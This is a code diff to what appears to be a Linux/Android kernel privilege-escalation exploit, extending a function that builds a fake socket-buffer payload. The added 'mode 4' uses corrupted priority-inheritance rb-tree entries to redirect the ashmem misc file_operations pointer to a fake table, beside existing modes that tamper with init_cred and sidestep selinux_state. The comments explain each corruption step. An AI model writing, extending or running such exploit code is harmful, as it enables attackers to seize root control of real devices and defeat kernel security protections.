@@ -502,7 +502,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     if (pselect_custom_write) {
       if (pselect_child_node) {
-        if (pselect_custom_write == 2) {
+        if (pselect_custom_write == 4) {
+          /* Write 4 (fops redirect): the actual write goes through W0's
+           * pi_tree (not the main tree). Set main tree to harmless values.
+           * The real write is rb_set_parent(pi_right=MISC_FOPS,
+           * parent=fake_fops), which stores fake_fops|color at *MISC_FOPS. */
+          fake_right = 0;
+        } else if (pselect_custom_write == 3) {
+          fake_right = pselect_custom_value;
+        } else if (pselect_custom_write == 2) {
           /* Write 2 (cred): child = REAL init_cred (P0 address).
            * child->__rb_parent_color corrupts init_cred.usage (bytes 0-7)
            * but that's just a ref count — large value = won't be freed.
@@ -542,6 +550,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
+  if (pselect_custom_write == 4) {
+    /* Mode 4 fops redirect: W0's pi_tree drives the write. */
+    write_pc = fake_fops;
+    write_right = data_addr(ASHMEM_MISC_FOPS);
+    write_left = 0;
+  }
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     write_pc = SLIDE_LOGGERS_0_1;
     write_right = 0;
@@ -585,7 +599,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      if (pselect_custom_write) {
+      if (pselect_custom_write == 4) {
+        /* Mode 4: dequeueing W0's PI tree entry performs the fops redirect. */
+        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+              fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+              fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+      } else if (pselect_custom_write) {
         /* Empty pi_waiters: erase uses W0's parent pointers (not root),
          * re-insert finds empty tree → sole root → no rebalancing.
          * This prevents the insert from touching selinux_state. */
